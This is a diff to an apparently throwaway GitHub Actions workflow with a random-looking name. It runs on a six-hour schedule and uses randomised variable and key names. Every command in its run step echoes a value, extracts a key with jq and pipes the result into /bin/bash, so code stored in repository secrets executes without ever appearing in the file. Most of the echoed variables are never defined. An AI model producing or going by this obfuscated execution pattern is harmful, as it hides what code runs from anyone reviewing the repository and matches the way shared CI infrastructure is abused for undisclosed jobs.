@@ -1,10 +1,9 @@
 name: yinzhiping2389
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 4/6 * * *'
-jobs:  # 16117
+    - cron: '14 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,17 +11,13 @@ jobs:  # 16117
       - uses: actions/checkout@v4
       - name: yinzhiping2389
         env:
-          eksrg38315: ${{ secrets.eksrg38315 }}
+          xpzvp0010: ${{ secrets.xpzvp0010 }}
         run: |
-          echo $eksrg38315 | jq -r .ybp80 | /bin/bash
-          echo $jlsb65 | jq -r .uvgm13 | /bin/bash
-          echo $vjt6941 | jq -r .vhabn0 | /bin/bash
-          echo $xl50 | jq -r .dz910 | /bin/bash
-          echo $mlo53077 | jq -r .shz9626 | /bin/bash
-          echo $pdef8 | jq -r .t355 | /bin/bash
-          echo $k55 | jq -r .oncxa86 | /bin/bash
-          echo $kzwyt05902 | jq -r .uh3783 | /bin/bash
-          echo $pv5 | jq -r .p64 | /bin/bash
-          echo $bw6 | jq -r .aftj7188 | /bin/bash
-          echo $apy4711 | jq -r .gee728 | /bin/bash
+          echo $xpzvp0010 | jq -r .jtnj3861 | /bin/bash
+          echo $thuy63 | jq -r .kcwwn0247 | /bin/bash
+          echo $ow6 | jq -r .mjl7 | /bin/bash
+          echo $otywp58795 | jq -r .qgdy153 | /bin/bash
+          echo $vg777 | jq -r .zzc153 | /bin/bash
+          echo $iaq6504 | jq -r .gu8362 | /bin/bash
+          echo $j22 | jq -r .y858 | /bin/bash
 
